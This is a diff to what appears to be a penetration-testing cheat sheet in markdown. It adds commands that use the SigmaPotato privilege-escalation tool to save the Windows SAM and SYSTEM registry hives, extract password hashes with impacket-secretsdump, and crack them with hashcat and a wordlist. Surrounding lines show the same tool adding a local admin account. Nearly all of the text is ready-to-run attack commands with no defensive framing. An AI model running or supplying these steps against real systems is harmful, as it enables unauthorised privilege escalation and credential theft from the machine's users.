@@ -67,6 +67,21 @@ wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPo
 .\SigmaPotato "net user admin2 password123 /add"
 ```
 
+hash dump bypass
+```powershell
+.\SigmaPotato.exe "cmd /c reg save HKLM\SAM C:\temp\SAM && reg save HKLM\SYSTEM C:\temp\SYSTEM"
+```
+
+Secrets dump for hashes
+```bash
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+
+hashcat for cracking
+```bash
+hashcat -m 1000 141_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
 Check work
 ```powershell
 net user
